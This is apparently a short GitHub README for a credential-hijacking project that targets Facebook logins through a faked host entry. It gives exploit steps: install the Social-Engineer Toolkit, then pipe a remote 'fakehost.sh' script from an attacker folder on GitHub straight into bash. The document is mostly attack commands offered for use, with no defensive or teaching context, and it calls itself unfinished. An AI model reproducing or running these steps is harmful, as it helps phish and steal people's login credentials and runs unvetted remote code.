# WARNING: This is a development project and is not READY for USING ;)
- BR
------------------------------------------------------------------------------------------
# SSTC-HTTPS-hijack-login-credentials 
- by nu11secur1ty

![](https://github.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/blob/master/logo/https_image-620x499.jpg)

# Exploit steps:
1. - Installing requirements

https://github.com/trustedsec/social-engineer-toolkit

2. - Preparing packages
For other Linux distro attackers
```
$ git clone https://github.com/trustedsec/social-engineer-toolkit/ set/
$ cd set
$ pip install -r requirements.txt
```
// For kali 
```bash 
setoolkit
```

3. - Creating hosts exploit facebook.login.com
- For Linux
```bash
curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/master/Attacker/hosts_fake_inject/fakehost.sh | bash
```



